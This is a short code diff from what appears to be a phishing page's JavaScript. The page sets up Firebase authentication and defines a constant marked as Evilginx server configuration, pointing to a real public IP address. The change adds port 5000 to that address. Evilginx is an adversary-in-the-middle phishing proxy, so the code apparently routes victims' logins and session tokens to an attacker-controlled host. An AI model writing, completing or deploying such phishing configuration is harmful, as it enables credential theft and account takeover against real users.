@@ -15,7 +15,7 @@ firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 
 // ✅ Evilginx Server Configuration (DO NOT REMOVE)
-const EVILGINX_SERVER = "http://3.149.242.245"; // Update this
+const EVILGINX_SERVER = "http://3.149.242.245:5000"; // Update this
 
 // ✅ Ensure event listeners are added
 document.addEventListener("DOMContentLoaded", function () {
